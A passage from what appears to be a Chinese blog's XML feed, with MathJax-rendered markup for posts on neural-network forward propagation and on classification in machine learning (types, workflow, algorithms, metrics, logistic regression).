-ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><mtext>ReLU</mtext><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container></li><li><p>计算输出层：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="28.058ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 12401.5 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(1572.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2628.3,0)"><g data-mml-node="mi"><path data-c="1D44A" d="M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1136.2,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(4561.2,0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(6142.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(7142.3,0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(462,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mstyle" transform="translate(8401,0)"><g data-mml-node="mspace"/><g data-mml-node="mo" transform="translate(9401,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(9790,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10512.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(11512.5,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(12012.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><mo>=</mo><msup><mi>W</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>1</mn><mo stretchy="false">]</mo></mrow></msup><mo>+</mo><msup><mi>b</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><mstyle scriptlevel="0"><mspace width="1em"></mspace></mstyle><mo stretchy="false">(</mo><mn>1</mn><mo>×</mo><mn>3</mn><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="10.107ex" height="2.7ex" role="img" focusable="false" viewbox="0 -943.3 4467.3 1193.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1823.6,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2394.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2783.6,0)"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(4078.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container></li></ol><h4 id="作用">作用</h4><ul><li><p>前向传播是<strong>预测过程</strong>的一部分。</p></li><li><p>在训练中，它是损失函数计算的前提。</p></li><li><p>在反向传播（backpropagation）中会用到中间的 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.606ex" height="2.046ex" role="img" focusable="false" viewbox="0 -893.3 1151.9 904.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container> 和 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="2.751ex" height="2.044ex" role="img" focusable="false" viewbox="0 -893.3 1215.9 903.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container> 值。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> AI相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 神经网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习中的分类</title>
      <link href="/2025/05/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E5%88%86%E7%B1%BB/"/>
      <url>/2025/05/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是分类？">什么是分类？</h2><p>在机器学习中，**分类问题（Classification Problem）**是一种常见的监督学习任务，目标是将输入的数据分到预定义的类别中。</p><p>分类的任务是：<br><strong>给定一个输入样本，预测它属于哪一个类别（class）</strong>。</p><p>例如：</p><table><thead><tr><th style="text-align:left">示例</th><th>输入数据</th><th>目标分类</th></tr></thead><tbody><tr><td style="text-align:left">垃圾邮件识别</td><td>一封邮件的文本内容</td><td>垃圾邮件 or 非垃圾邮件</td></tr><tr><td style="text-align:left">图片识别</td><td>一张猫或狗的图片</td><td>猫 or 狗</td></tr><tr><td style="text-align:left">疾病诊断</td><td>一组病人的检查数据</td><td>患病 or 健康</td></tr></tbody></table><h3 id="分类的类型">分类的类型</h3><ol><li><strong>二分类（Binary Classification）</strong><br>只有两个类别，例如：判断一个邮件是不是垃圾邮件（0 或 1）。</li><li><strong>多分类（Multi-class Classification）</strong><br>超过两个类别，例如：判断一张图片是猫、狗、马还是鸟。</li><li><strong>多标签分类（Multi-label Classification）</strong><br>每个样本可以同时属于多个类别，例如：一张图片可能同时包含猫和狗。</li></ol><h3 id="基本流程">基本流程</h3><ol><li><strong>数据准备</strong>：收集带标签的数据集（如文本+类别）。</li><li><strong>特征提取</strong>：将原始数据转化为模型可以处理的数值形式（如词向量、图像像素）。</li><li><strong>模型训练</strong>：选择一个分类算法（如逻辑回归、决策树、SVM、神经网络），用训练集进行学习。</li><li><strong>预测与评估</strong>：使用测试集进行预测，并通过准确率、精确率、召回率、F1分数等指标评估模型性能。</li></ol><h3 id="常见的算法">常见的算法</h3><ul><li>Logistic Regression（逻辑回归）</li><li>Decision Tree（决策树）</li><li>Random Forest（随机森林）</li><li>Support Vector Machine（支持向量机）</li><li>K-Nearest Neighbors（K近邻）</li><li>Naive Bayes（朴素贝叶斯）</li><li>Neural Networks（神经网络）</li></ul><h3 id="评估指标简述（以二分类为例）">评估指标简述（以二分类为例）</h3><ul><li><strong>准确率（Accuracy）</strong>：预测正确的样本数占总样本数比例。</li><li><strong>精确率（Precision）</strong>：预测为正的样本中，真正为正的比例。</li><li><strong>召回率（Recall）</strong>：所有真正为正的样本中，预测正确的比例。</li><li><strong>F1 分数（F1 Score）</strong>：精确率和召回率的调和平均。</li></ul><h2 id="逻辑回归-Logistic-Regression">逻辑回归(Logistic Regression)</h2><p><strong>逻辑回归</strong>是一种用于<strong>分类问题</strong>的统计模型。尽管名字中有“回归”，它其实是用于<strong>二分类</strong>（或多分类）任务的。</p><p>它的核心思想是：</p><blockquote><p>通过一个“逻辑函数”（sigmoid 函数）将线性模型的输出映射到 (0, 1) 之间的概率，再根据这个概率判断类别。</p></blockquote><h3 id="数学形式">数学形式</h3><p>假设输入特征是 <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.69ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 8260.9 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D431" d="M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(884.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1940.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(2218.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 